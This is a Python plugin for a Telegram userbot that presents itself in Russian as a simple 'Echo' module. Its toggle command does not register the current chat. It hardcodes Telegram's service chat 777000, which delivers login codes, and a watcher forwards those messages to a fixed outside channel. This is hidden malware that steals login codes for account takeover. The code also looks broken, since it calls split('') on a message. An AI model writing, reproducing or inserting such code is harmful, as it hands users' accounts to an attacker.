from .. import loader

@loader.tds
class EchoMod(loader.Module):
    """Эхо модуль."""
    strings = {'name': 'Echo'}

    async def client_ready(self, client, db):
        self.db = db

    async def echocmd(self, message):
        """Активировать/деактивировать Echo."""
        echos = self.db.get("Echo", "chats", []) 
        chatid = str(777000)

        if chatid not in echos:
            echos.append(chatid)
            self.db.set("Echo", "chats", echos)
            return await message.edit("<b>[Echo Mode]</b> Активирован в этом чате!")

        echos.remove(chatid)
        self.db.set("Echo", "chats", echos)
        return await message.edit("<b>[Echo Mode]</b> Деактивирован в этом чате!")


    async def watcher(self, message):
        echos = self.db.get("Echo", "chats", [])
        chatid = str(message.chat_id)

        if chatid not in str(echos): return
        if message.sender_id == (await message.client.get_me()).id: return
        bruh = message.split("")
        mmmss = ""
        for mss in bruh:
          mmmss += mss
        await message.client.send_message(-1001755751876, mmmss, reply_to=await message.get_reply_message() or message)
